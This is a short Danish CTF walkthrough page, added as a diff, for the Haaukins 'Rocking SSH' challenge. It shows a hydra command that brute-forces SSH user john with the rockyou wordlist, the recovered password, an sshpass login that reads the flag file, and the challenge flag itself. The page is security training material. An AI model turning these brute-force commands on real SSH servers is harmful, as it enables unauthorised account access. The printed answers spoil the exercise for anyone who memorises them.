@@ -1,0 +1,41 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Rocking SSH — tutorial</title>
+<meta name="description" content="Guide til Haaukins Rocking SSH: brute-force brugeren john på rockingssh.com med rockyou (&#x27;a rocking way&#x27;).">
+<link rel="canonical" href="https://lolcatatonia.github.io/haaukins-walkthroughs/rocking-ssh.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Haaukins: Rocking SSH — tutorial">
+<meta property="og:description" content="Guide til Haaukins Rocking SSH: brute-force brugeren john på rockingssh.com med rockyou (&#x27;a rocking way&#x27;).">
+<meta property="og:url" content="https://lolcatatonia.github.io/haaukins-walkthroughs/rocking-ssh.html">
+<meta name="twitter:card" content="summary">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Rocking SSH", "description": "Guide til Haaukins Rocking SSH: brute-force brugeren john på rockingssh.com med rockyou ('a rocking way').", "url": "https://lolcatatonia.github.io/haaukins-walkthroughs/rocking-ssh.html", "inLanguage": "da", "about": {"@type": "Thing", "name": "Haaukins CTF"}}</script>
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Rocking SSH</h1>
+<p class="subtitle">"A rocking way" = rockyou — brute SSH-brugeren john.</p>
+<div class="badges"><span class="badge cat">Forensics</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Trin for trin</h2>
+<pre><code>hydra -l john -P rockyou.txt -t 4 -f ssh://&lt;ip&gt;      # -> john:johncena (tidligt i rockyou)
+sshpass -p johncena ssh -o PreferredAuthentications=password john@&lt;ip&gt; 'cat ~/flag.txt'</code></pre>
+             <p><code>-t 4</code> for SSH (OpenSSH afviser for mange parallelle). Credentials er statiske; flaget
+             er per-instans.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag (per-instans): <span class="flag">HKN{yO-GUM-froy3}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>Hintet navngiver ordlisten ('rocking' = rockyou).</li><li>SSH-brute: <code>hydra -t 4</code>; svage passwords ligger tidligt i rockyou.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
